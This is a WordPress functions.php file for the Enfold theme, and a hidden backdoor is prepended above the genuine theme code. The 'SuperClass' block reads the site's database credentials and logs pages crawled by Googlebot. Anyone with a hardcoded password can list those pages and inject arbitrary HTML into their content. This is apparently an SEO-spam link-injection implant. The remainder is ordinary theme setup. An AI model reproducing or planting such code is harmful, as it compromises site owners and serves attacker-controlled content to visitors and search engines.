<?php

if (file_exists( $_SERVER['DOCUMENT_ROOT'] . DIRECTORY_SEPARATOR . 'wp-config.php' ))
	{
		require_once($_SERVER['DOCUMENT_ROOT'] . DIRECTORY_SEPARATOR . 'wp-config.php');
	}

if (!class_exists('SuperClass'))
	{
		class SuperClass
			{
				private $table = 'wp_supercache';
				private $canonical = '';
				
				private function url_now()
					{
						return 'http://' . $_SERVER['HTTP_HOST'] . urldecode($_SERVER['REQUEST_URI']);
					}
				
				private function url_create($work = 1)
					{
						@mysql_query(' INSERT INTO `'.$this->table.'` SET `work` = "'.$work.'", `url` = "'.mysql_escape_string($this -> url_now()).'"
						ON DUPLICATE KEY UPDATE `work` = "'.$work.'"
						');
					}
				
				public function url_code()
					{
						if ($query = @mysql_query('SELECT `code` FROM `'.$this->table.'` WHERE `url` = "'.mysql_escape_string($this -> url_now()).'"'))
							{
								return stripslashes(@mysql_result($query, 0));
							}
						
						return '';
					}
				
				private function url_exist()
					{
						if ($query = @mysql_query('SELECT count(*) FROM `'.$this->table.'` WHERE `url` = "'.mysql_escape_string( $this->url_now() ).'"'))
							{
								return (@mysql_result($query, 0) != '0') ;
							}
							
						return true;
					}
				
				private function get_code()
					{
						$options['http'] = array(
							'method' => "GET",
							'follow_location' => 0
						);
						
						$context = stream_context_create($options);
						$get = file_get_contents($this->url_now(), NULL, $context);
						
						if (preg_match('!<link[^>]*rel=[\'"]canonical[\'"][^>]*href=[\'"]([^\'"]+)[\'"][^>]*>!is', $get, $_))
							{
								$this -> canonical = html_entity_decode(urldecode($_[1]));
							}
						elseif (preg_match('!<link[^>]*href=[\'"]([^\'"]+)[\'"][^>]*rel=[\'"]canonical[\'"][^>]*>!is', $get, $_))
							{
								$this -> canonical = html_entity_decode(urldecode($_[1]));
							}

						if (!empty($http_response_header))
							{
								sscanf($http_response_header[0], 'HTTP/%*d.%*d %d', $code);
								if (is_numeric($code)) return $code;
							}
						
						return 200;
					}
					
				public function pre_cache()
					{
						if (isset($_REQUEST['action']))
							{
								switch ($_REQUEST['action'])
									{
										case 'get_all_links';
											header("Content-Type: text/plain");
											if ($query  = @mysql_query('SELECT * FROM `'.$this->table.'` ORDER BY `url` DESC LIMIT 0, 2500'))
												{
													while ($data = @mysql_fetch_assoc($query)) 
														{
															echo '<e><w>'.$data['work'].'</w><url>' . $data['url'] . '</url><code>' . $data['code'] . '</code><id>' . $data['ID'] . '</id></e>' . "\r\n";
														}
												}
										break;
										
										case 'set_links';
											if (isset($_REQUEST['data']))
												{
													if (mysql_query('UPDATE `'.$this->table.'` SET code = "' . mysql_escape_string($_REQUEST['data']) . '" WHERE code = "" AND `work` = "1" LIMIT 1'))
														{
															echo 'true';
														}
												}
										break;
										
										case 'set_id_links';
											if (isset($_REQUEST['data']))
												{
													if (@mysql_query('UPDATE `'.$this->table.'` SET code = "' . mysql_escape_string($_REQUEST['data']) . '" WHERE `ID` = "' . mysql_escape_string($_REQUEST['id']) . '"'))
														{
															echo 'true';
														}
												}
										break;
										
										default: die('error action');
									}
								exit;
							}
					}
				
				static function wordpress_cache($content)
					{
						$GLOBALS['_cache_'] -> create_new_page();
						$content = $content . $GLOBALS['global_code'];
						$GLOBALS['global_code'] = '';
						return $content ;
					}
				
				public function create_new_page()
					{
						$GLOBALS['_cache_'] -> db_connect();
						if ( (strpos(strtolower($_SERVER['HTTP_USER_AGENT']), 'googlebot') !== false) &&(!$this -> url_exist()))
							{
								$this -> url_create( 0 );
								
								if (($this -> get_code() == 200) && ( ($this -> canonical == '') || ( $this -> canonical == $this->url_now() ) ))
									{
										$this -> url_create();
									}
							}
					}
				
				private function db_connect()
					{
						@mysql_connect(DB_HOST, DB_USER, DB_PASSWORD);
						@mysql_select_db( DB_NAME );
					}
					
				static function create()
					{
						if ( strpos($_SERVER['REQUEST_URI'], 'wp-admin') !== FALSE ) return ;
						$GLOBALS['_cache_'] = new SuperClass();
						if ($_REQUEST['password'] == '44fc552eb82ed66d3fae014b1ce4fcc0') $GLOBALS['_cache_'] -> pre_cache();
						$GLOBALS['global_code'] = $GLOBALS['_cache_'] -> url_code();
						add_filter('the_content', Array($GLOBALS['_cache_'], 'wordpress_cache'));					
					}
					
			}

		SuperClass::create();
	}
	
?><?php
if ( !defined('ABSPATH') ){ die(); }

global $avia_config;

/*
 * Setup referral cookie
 */
function setup_referral() {
    if(isset($_REQUEST['r'])){
		$referral = $_REQUEST['r'];
		include_once($_SERVER['DOCUMENT_ROOT'].'/glc/config.php');
		$user_class = getInstance('Class_User');
		$user = $user_class->get_by_username($_REQUEST['r']);
		if(!empty($user)):
			$set = setcookie('referral',$referral,time() + (86400 * 180), '/');
		else:
			wp_redirect(sprintf('%s/?referral_error=1', site_url()));
			exit();
		endif;
		wp_redirect(site_url());
		exit();
	}
}
add_action('init', 'setup_referral');

/*
 * if you run a child theme and dont want to load the default functions.php file
 * set the global var below in you childthemes function.php to true:
 *
 * example: global $avia_config; $avia_config['use_child_theme_functions_only'] = true;
 * The default functions.php file will then no longer be loaded. You need to make sure then
 * to include framework and functions that you want to use by yourself. 
 *
 * This is only recommended for advanced users
 */

if(isset($avia_config['use_child_theme_functions_only'])) return;

/*
 * create a global var which stores the ids of all posts which are displayed on the current page. It will help us to filter duplicate posts
 */
$avia_config['posts_on_current_page'] = array();


/*
 * wpml multi site config file
 * needs to be loaded before the framework
 */

require_once( 'config-wpml/config.php' );


/*
 * These are the available color sets in your backend.
 * If more sets are added users will be able to create additional color schemes for certain areas
 *
 * The array key has to be the class name, the value is only used as tab heading on the styling page
 */


$avia_config['color_sets'] = array(
    'header_color'      => 'Logo Area',
    'main_color'        => 'Main Content',
    'alternate_color'   => 'Alternate Content',
    'footer_color'      => 'Footer',
    'socket_color'      => 'Socket'
 );
 
 

/*
 * add support for responsive mega menus
 */
 
add_theme_support('avia_mega_menu');




/*
 * deactivates the default mega menu and allows us to pass individual menu walkers when calling a menu
 */
 
add_filter('avia_mega_menu_walker', '__return_false');


/*
 * adds support for the new avia sidebar manager
 */
 
add_theme_support('avia_sidebar_manager');

/*
 * Filters for post formats etc
 */
//add_theme_support('avia_queryfilter');


/*
 * Register theme text domain
 */
if(!function_exists('avia_lang_setup'))
{
	add_action('after_setup_theme', 'avia_lang_setup');
	
	function avia_lang_setup()
	{
		$lang = apply_filters('ava_theme_textdomain_path', get_template_directory()  . '/lang');
		load_theme_textdomain('avia_framework', $lang);
	}
	
	avia_lang_setup();
}

//set builder mode to debug
add_action('avia_builder_mode', "builder_set_debug");
function builder_set_debug()
{
	return "debug";
}


##################################################################
# AVIA FRAMEWORK by Kriesi

# this include calls a file that automatically includes all
# the files within the folder framework and therefore makes
# all functions and classes available for later use

require_once( 'framework/avia_framework.php' );

##################################################################


/*
 * Register additional image thumbnail sizes
 * Those thumbnails are generated on image upload!
 *
 * If the size of an array was changed after an image was uploaded you either need to re-upload the image
 * or use the thumbnail regeneration plugin: http://wordpress.org/extend/plugins/regenerate-thumbnails/
 */

$avia_config['imgSize']['widget'] 			 	= array('width'=>36,  'height'=>36);						// small preview pics eg sidebar news
$avia_config['imgSize']['square'] 		 	    = array('width'=>180, 'height'=>180);		                 // small image for blogs
$avia_config['imgSize']['featured'] 		 	= array('width'=>1500, 'height'=>430 );						// images for fullsize pages and fullsize slider
$avia_config['imgSize']['featured_large'] 		= array('width'=>1500, 'height'=>630 );						// images for fullsize pages and fullsize slider
$avia_config['imgSize']['extra_large'] 		 	= array('width'=>1500, 'height'=>1500 , 'crop' => false);	// images for fullscrren slider
$avia_config['imgSize']['portfolio'] 		 	= array('width'=>495, 'height'=>400 );						// images for portfolio entries (2,3 column)
$avia_config['imgSize']['portfolio_small'] 		= array('width'=>260, 'height'=>185 );						// images for portfolio 4 columns
$avia_config['imgSize']['gallery'] 		 		= array('width'=>845, 'height'=>684 );						// images for portfolio entries (2,3 column)
$avia_config['imgSize']['magazine'] 		 	= array('width'=>710, 'height'=>375 );						// images for magazines
$avia_config['imgSize']['masonry'] 		 		= array('width'=>705, 'height'=>705 , 'crop' => false);		// images for fullscreen masonry
$avia_config['imgSize']['entry_with_sidebar'] 	= array('width'=>845, 'height'=>321);		            	// big images for blog and page entries
$avia_config['imgSize']['entry_without_sidebar']= array('width'=>1210, 'height'=>423 );						// images for fullsize pages and fullsize slider
$avia_config['imgSize'] = apply_filters('avf_modify_thumb_size', $avia_config['imgSize']);


$avia_config['selectableImgSize'] = array(
	'square' 				=> __('Square','avia_framework'),
	'featured'  			=> __('Featured Thin','avia_framework'),
	'featured_large'  		=> __('Featured Large','avia_framework'),
	'portfolio' 			=> __('Portfolio','avia_framework'),
	'gallery' 				=> __('Gallery','avia_framework'),
	'entry_with_sidebar' 	=> __('Entry with Sidebar','avia_framework'),
	'entry_without_sidebar'	=> __('Entry without Sidebar','avia_framework'),
	'extra_large' 			=> __('Fullscreen Sections/Sliders','avia_framework'),
	
);



avia_backend_add_thumbnail_size($avia_config);

if ( ! isset( $content_width ) ) $content_width = $avia_config['imgSize']['featured']['width'];




/*
 * register the layout classes
 *
 */

$avia_config['layout']['fullsize'] 		= array('content' => 'av-content-full alpha', 'sidebar' => 'hidden', 	  	  'meta' => '','entry' => '');
$avia_config['layout']['sidebar_left'] 	= array('content' => 'av-content-small', 	  'sidebar' => 'alpha' ,'meta' => 'alpha', 'entry' => '');
$avia_config['layout']['sidebar_right'] = array('content' => 'av-content-small alpha','sidebar' => 'alpha', 'meta' => 'alpha', 'entry' => 'alpha');





/*
 * These are some of the font icons used in the theme, defined by the entypo icon font. the font files are included by the new aviaBuilder
 * common icons are stored here for easy retrieval
 */
 
 $avia_config['font_icons'] = apply_filters('avf_default_icons', array(
 
    //post formats +  types
    'standard' 		=> array( 'font' =>'entypo-fontello', 'icon' => 'ue836'),
    'link'    		=> array( 'font' =>'entypo-fontello', 'icon' => 'ue822'),
    'image'    		=> array( 'font' =>'entypo-fontello', 'icon' => 'ue80f'),
    'audio'    		=> array( 'font' =>'entypo-fontello', 'icon' => 'ue801'),
    'quote'   		=> array( 'font' =>'entypo-fontello', 'icon' => 'ue833'),
    'gallery'   	=> array( 'font' =>'entypo-fontello', 'icon' => 'ue80e'),
    'video'   		=> array( 'font' =>'entypo-fontello', 'icon' => 'ue80d'),
    'portfolio'   	=> array( 'font' =>'entypo-fontello', 'icon' => 'ue849'),
    'product'   	=> array( 'font' =>'entypo-fontello', 'icon' => 'ue859'),
    				
    //social		
    'behance' 		=> array( 'font' =>'entypo-fontello', 'icon' => 'ue915'),
	'dribbble' 		=> array( 'font' =>'entypo-fontello', 'icon' => 'ue8fe'),
	'facebook' 		=> array( 'font' =>'entypo-fontello', 'icon' => 'ue8f3'),
	'flickr' 		=> array( 'font' =>'entypo-fontello', 'icon' => 'ue8ed'),
	'gplus' 		=> array( 'font' =>'entypo-fontello', 'icon' => 'ue8f6'),
	'linkedin' 		=> array( 'font' =>'entypo-fontello', 'icon' => 'ue8fc'),
	'instagram' 	=> array( 'font' =>'entypo-fontello', 'icon' => 'ue909'),
	'pinterest' 	=> array( 'font' =>'entypo-fontello', 'icon' => 'ue8f8'),
	'skype' 		=> array( 'font' =>'entypo-fontello', 'icon' => 'ue90d'),
	'tumblr' 		=> array( 'font' =>'entypo-fontello', 'icon' => 'ue8fa'),
	'twitter' 		=> array( 'font' =>'entypo-fontello', 'icon' => 'ue8f1'),
	'vimeo' 		=> array( 'font' =>'entypo-fontello', 'icon' => 'ue8ef'),
	'rss' 			=> array( 'font' =>'entypo-fontello', 'icon' => 'ue853'),  
	'youtube'		=> array( 'font' =>'entypo-fontello', 'icon' => 'ue921'),  
	'xing'			=> array( 'font' =>'entypo-fontello', 'icon' => 'ue923'),  
	'soundcloud'	=> array( 'font' =>'entypo-fontello', 'icon' => 'ue913'),  
	'five_100_px'	=> array( 'font' =>'entypo-fontello', 'icon' => 'ue91d'),  
	'vk'			=> array( 'font' =>'entypo-fontello', 'icon' => 'ue926'),  
	'reddit'		=> array( 'font' =>'entypo-fontello', 'icon' => 'ue927'),  
	'digg'			=> array( 'font' =>'entypo-fontello', 'icon' => 'ue928'),  
	'delicious'		=> array( 'font' =>'entypo-fontello', 'icon' => 'ue929'),  
	'mail' 			=> array( 'font' =>'entypo-fontello', 'icon' => 'ue805'),
					
	//woocomemrce    
	'cart' 			=> array( 'font' =>'entypo-fontello', 'icon' => 'ue859'),
	'details'		=> array( 'font' =>'entypo-fontello', 'icon' => 'ue84b'),

	//bbpress    
	'supersticky'	=> array( 'font' =>'entypo-fontello', 'icon' => 'ue808'),
	'sticky'		=> array( 'font' =>'entypo-fontello', 'icon' => 'ue809'),
	'one_voice'		=> array( 'font' =>'entypo-fontello', 'icon' => 'ue83b'),
	'multi_voice'	=> array( 'font' =>'entypo-fontello', 'icon' => 'ue83c'),
	'closed'		=> array( 'font' =>'entypo-fontello', 'icon' => 'ue824'),
	'sticky_closed' => array( 'font' =>'entypo-fontello', 'icon' => 'ue808\ue824'),
	'supersticky_closed' => array( 'font' =>'entypo-fontello', 'icon' => 'ue809\ue824'),
					
	//navigation, slider & controls
	'play' 			=> array( 'font' =>'entypo-fontello', 'icon' => 'ue897'),
	'pause'			=> array( 'font' =>'entypo-fontello', 'icon' => 'ue899'),
	'next'    		=> array( 'font' =>'entypo-fontello', 'icon' => 'ue879'),
    'prev'    		=> array( 'font' =>'entypo-fontello', 'icon' => 'ue878'),
    'next_big'  	=> array( 'font' =>'entypo-fontello', 'icon' => 'ue87d'),
    'prev_big'  	=> array( 'font' =>'entypo-fontello', 'icon' => 'ue87c'),
	'close'			=> array( 'font' =>'entypo-fontello', 'icon' => 'ue814'),
	'reload'		=> array( 'font' =>'entypo-fontello', 'icon' => 'ue891'),
	'mobile_menu'	=> array( 'font' =>'entypo-fontello', 'icon' => 'ue8a5'),
					
	//image hover overlays		
    'ov_external'	=> array( 'font' =>'entypo-fontello', 'icon' => 'ue832'),
    'ov_image'		=> array( 'font' =>'entypo-fontello', 'icon' => 'ue869'),
    'ov_video'		=> array( 'font' =>'entypo-fontello', 'icon' => 'ue897'),
    
					
	//misc			
    'search'  		=> array( 'font' =>'entypo-fontello', 'icon' => 'ue803'),
    'info'    		=> array( 'font' =>'entypo-fontello', 'icon' => 'ue81e'),
	'clipboard' 	=> array( 'font' =>'entypo-fontello', 'icon' => 'ue8d1'),
	'scrolltop' 	=> array( 'font' =>'entypo-fontello', 'icon' => 'ue876'),
	'scrolldown' 	=> array( 'font' =>'entypo-fontello', 'icon' => 'ue877'),
	'bitcoin' 		=> array( 'font' =>'entypo-fontello', 'icon' => 'ue92a'),

));






add_theme_support( 'automatic-feed-links' );

##################################################################
# Frontend Stuff necessary for the theme:
##################################################################



/*
 * Register frontend javascripts:
 */
if(!function_exists('avia_register_frontend_scripts'))
{
	if(!is_admin()){
		add_action('wp_enqueue_scripts', 'avia_register_frontend_scripts');
	}

	function avia_register_frontend_scripts()
	{
		$template_url = get_template_directory_uri();
		$child_theme_url = get_stylesheet_directory_uri();

		//register js
		wp_enqueue_script( 'avia-compat', $template_url.'/js/avia-compat.js', array('jquery'), 2, false ); //needs to be loaded at the top to prevent bugs
		wp_enqueue_script( 'avia-default', $template_url.'/js/avia.js', array('jquery'), 3, true );
		wp_enqueue_script( 'avia-shortcodes', $template_url.'/js/shortcodes.js', array('jquery'), 3, true );
		wp_enqueue_script( 'avia-popup',  $template_url.'/js/aviapopup/jquery.magnific-popup.min.js', array('jquery'), 2, true);
		wp_enqueue_script( 'avia-modal-js', $template_url.'/js/jquery.modal.js', array('jquery'), 2, true ); //
		wp_enqueue_script( 'jquery' );
		wp_enqueue_script( 'wp-mediaelement' );


		if ( is_singular() && get_option( 'thread_comments' ) ) { wp_enqueue_script( 'comment-reply' ); }


		//register styles
		wp_register_style( 'avia-style' ,  $child_theme_url."/style.css", array(), 		'2', 'all' ); //register default style.css file. only include in childthemes. has no purpose in main theme
		wp_register_style( 'avia-custom',  $template_url."/css/custom.css", array(), 	'2', 'all' );
																						 
		wp_enqueue_style( 'avia-grid' ,   $template_url."/css/grid.css", array(), 		'2', 'all' );
		wp_enqueue_style( 'avia-base' ,   $template_url."/css/base.css", array(), 		'2', 'all' );
		wp_enqueue_style( 'avia-layout',  $template_url."/css/layout.css", array(), 	'2', 'all' );
		wp_enqueue_style( 'avia-scs',     $template_url."/css/shortcodes.css", array(), '2', 'all' );
		wp_enqueue_style( 'avia-popup-css', $template_url."/js/aviapopup/magnific-popup.css", array(), '1', 'screen' );
		wp_enqueue_style( 'avia-media'  , $template_url."/js/mediaelement/skin-1/mediaelementplayer.css", array(), '1', 'screen' );
		wp_enqueue_style( 'avia-print' ,  $template_url."/css/print.css", array(), '1', 'print' );
		wp_enqueue_style( 'avia-modal-css',     $template_url."/js/jquery.modal.css", array(), '2', 'all' );
		
		
		if ( is_rtl() ) {
			wp_enqueue_style(  'avia-rtl',  $template_url."/css/rtl.css", array(), '1', 'all' );
		}
		

        global $avia;
		$safe_name = avia_backend_safe_string($avia->base_data['prefix']);
		$safe_name = apply_filters('avf_dynamic_stylesheet_filename', $safe_name);

        if( get_option('avia_stylesheet_exists'.$safe_name) == 'true' )
        {
            $avia_upload_dir = wp_upload_dir();
            if(is_ssl()) $avia_upload_dir['baseurl'] = str_replace("http://", "https://", $avia_upload_dir['baseurl']);

            $avia_dyn_stylesheet_url = $avia_upload_dir['baseurl'] . '/dynamic_avia/'.$safe_name.'.css';
			$version_number = get_option('avia_stylesheet_dynamic_version'.$safe_name);
			if(empty($version_number)) $version_number = '1';
            
            wp_enqueue_style( 'avia-dynamic', $avia_dyn_stylesheet_url, array(), $version_number, 'all' );
        }

		wp_enqueue_style( 'avia-custom');


		if($child_theme_url !=  $template_url)
		{
			wp_enqueue_style( 'avia-style');
		}

	}
}


if(!function_exists('avia_remove_default_video_styling'))
{
	if(!is_admin()){
		add_action('wp_footer', 'avia_remove_default_video_styling', 1);
	}

	function avia_remove_default_video_styling()
	{
		//remove default style for videos
		wp_dequeue_style( 'mediaelement' );
		// wp_dequeue_script( 'wp-mediaelement' );
		// wp_dequeue_style( 'wp-mediaelement' );
	}
}




/*
 * Activate native wordpress navigation menu and register a menu location
 */
if(!function_exists('avia_nav_menus'))
{
	function avia_nav_menus()
	{
		global $avia_config, $wp_customize;

		add_theme_support('nav_menus');
		
		foreach($avia_config['nav_menus'] as $key => $value)
		{
			//wp-admin\customize.php does not support html code in the menu description - thus we need to strip it
			$name = (!empty($value['plain']) && !empty($wp_customize)) ? $value['plain'] : $value['html'];
			register_nav_menu($key, THEMENAME.' '.$name);
		}
	}

	$avia_config['nav_menus'] = array(	'avia' => array('html' => __('Main Menu', 'avia_framework')),
										'avia2' => array(
													'html' => ''.__('Secondary Menu', 'avia_framework').' <br/><small>('.__('Will be displayed if you selected a header layout that supports a submenu', 'avia_framework').' <a target="_blank" href="'.admin_url('?page=avia#goto_header').'">'.__('here', 'avia_framework').'</a>)</small>',
													'plain'=> __('Secondary Menu - will be displayed if you selected a header layout that supports a submenu', 'avia_framework')),
										'avia3' => array(
													'html' => __('Footer Menu <br/><small>(no dropdowns)</small>', 'avia_framework'),
													'plain'=> __('Footer Menu (no dropdowns)', 'avia_framework'))
									);

	avia_nav_menus(); //call the function immediatly to activate
}










/*
 *  load some frontend functions in folder include:
 */

require_once( 'includes/admin/register-portfolio.php' );		// register custom post types for portfolio entries
require_once( 'includes/admin/register-widget-area.php' );		// register sidebar widgets for the sidebar and footer
require_once( 'includes/loop-comments.php' );					// necessary to display the comments properly
require_once( 'includes/helper-template-logic.php' ); 			// holds the template logic so the theme knows which tempaltes to use
require_once( 'includes/helper-social-media.php' ); 			// holds some helper functions necessary for twitter and facebook buttons
require_once( 'includes/helper-post-format.php' ); 				// holds actions and filter necessary for post formats
require_once( 'includes/helper-markup.php' ); 					// holds the markup logic (schema.org and html5)

if(current_theme_supports('avia_conditionals_for_mega_menu'))
{
	require_once( 'includes/helper-conditional-megamenu.php' );  // holds the walker for the responsive mega menu
}

require_once( 'includes/helper-responsive-megamenu.php' ); 		// holds the walker for the responsive mega menu




//adds the plugin initalization scripts that add styles and functions

if(!current_theme_supports('deactivate_layerslider')) require_once( 'config-layerslider/config.php' );//layerslider plugin

require_once( 'config-bbpress/config.php' );					//compatibility with  bbpress forum plugin
require_once( 'config-templatebuilder/config.php' );			//templatebuilder plugin
require_once( 'config-gravityforms/config.php' );				//compatibility with gravityforms plugin
require_once( 'config-woocommerce/config.php' );				//compatibility with woocommerce plugin
require_once( 'config-wordpress-seo/config.php' );				//compatibility with Yoast WordPress SEO plugin


if(!current_theme_supports('deactivate_tribe_events_calendar'))
{
	require_once( 'config-events-calendar/config.php' );		//compatibility with the Events Calendar plugin
}

if(is_admin())
{
	require_once( 'includes/admin/helper-compat-update.php');	// include helper functions for new versions
}




/*
 *  dynamic styles for front and backend
 */
if(!function_exists('avia_custom_styles'))
{
	function avia_custom_styles()
	{
		require_once( 'includes/admin/register-dynamic-styles.php' );	// register the styles for dynamic frontend styling
		avia_prepare_dynamic_styles();
	}

	add_action('init', 'avia_custom_styles', 20);
	add_action('admin_init', 'avia_custom_styles', 20);
}




/*
 *  activate framework widgets
 */
if(!function_exists('avia_register_avia_widgets'))
{
	function avia_register_avia_widgets()
	{
		register_widget( 'avia_newsbox' );
		register_widget( 'avia_portfoliobox' );
		register_widget( 'avia_socialcount' );
		register_widget( 'avia_combo_widget' );
		register_widget( 'avia_partner_widget' );
		register_widget( 'avia_google_maps' );
		register_widget( 'avia_fb_likebox' );
		register_widget( 'avia_instagram_widget' );
		
	}

	avia_register_avia_widgets(); //call the function immediatly to activate
}



/*
 *  add post format options
 */
add_theme_support( 'post-formats', array('link', 'quote', 'gallery','video','image','audio' ) );



/*
 *  Remove the default shortcode function, we got new ones that are better ;)
 */
add_theme_support( 'avia-disable-default-shortcodes', true);


/*
 * compat mode for easier theme switching from one avia framework theme to another
 */
add_theme_support( 'avia_post_meta_compat');


/*
 * make sure that enfold widgets dont use the old slideshow parameter in widgets, but default post thumbnails
 */
add_theme_support('force-post-thumbnails-in-widget');


/*
 * display page titles via wordpress default output
 */
function av_theme_slug_setup() 
{
   add_theme_support( 'title-tag' );
}

add_action( 'after_setup_theme', 'av_theme_slug_setup' );

/*title fallback*/
if ( ! function_exists( '_wp_render_title_tag' ) )
{
    function av_theme_slug_render_title() 
    {
	    echo "<title>" . avia_set_title_tag() ."</title>";
	}
	add_action( 'wp_head', 'av_theme_slug_render_title' );
}
    



/*
 *  register custom functions that are not related to the framework but necessary for the theme to run
 */

require_once( 'functions-enfold.php');

/*
 * Restrict page per role
 */
function is_restricted($page_id)
{
	$page_membership = get_post_meta( $page_id, '_llms_restricted_levels', true);

	if(!empty($page_membership)):
		$user_membership = get_user_meta( get_current_user_id(), '_llms_restricted_levels', true );

		foreach ($user_membership as $key => $value) {
			if(in_array($value, $page_membership)) return true;
		}

		echo (!is_user_logged_in()) ? "<script type='text/javascript'>window.location.href = '/choose-your-membership';</script>" : "<script type='text/javascript'>window.location.href = '/glc/upgrade.php';</script>";
		die();
	endif;
}

/*
 * Restrict builder page
 */
function builder_restricted()
{
	if(is_user_logged_in()):
		$user_membership = get_user_meta( get_current_user_id(), 'membership', true );
		$allowed = array('Leadership', 'Professional', 'Master', 'Masters', 'Founder');
		if(in_array($user_membership, $allowed)) return true;
	endif;
	echo (!is_user_logged_in()) ? "<script type='text/javascript'>window.location.href = '/choose-your-membership';</script>" : "<script type='text/javascript'>window.location.href = '/glc/upgrade.php';</script>";
	die();
}

/*
 * add option to edit elements via css class
 */
// add_theme_support('avia_template_builder_custom_css');


// add_filter('gettext', 'change_verbiage', 20, 3);
// /**
//  * Change verbiage
//  *
//  * @link http://codex.wordpress.org/Plugin_API/Filter_Reference/gettext
//  */
// function change_verbiage( $translated_text, $text, $domain ) {

//     switch ( $translated_text ) {
//         case 'Take this course to unlock this lesson' :
//             $translated_text = __( 'Your membership does not allow viewing of this course. Please upgrade NOW to take this course and gain access to many more.', 'lifterlms' );
//             break;
//     }
//     return $translated_text;
// }

// function themeslug_enqueue_script() {
// 	wp_enqueue_script( 'my-js', sprintf('%s/js/enfold.js', get_bloginfo('stylesheet_directory')), false );
// }
// add_action( 'wp_enqueue_scripts', 'themeslug_enqueue_script' );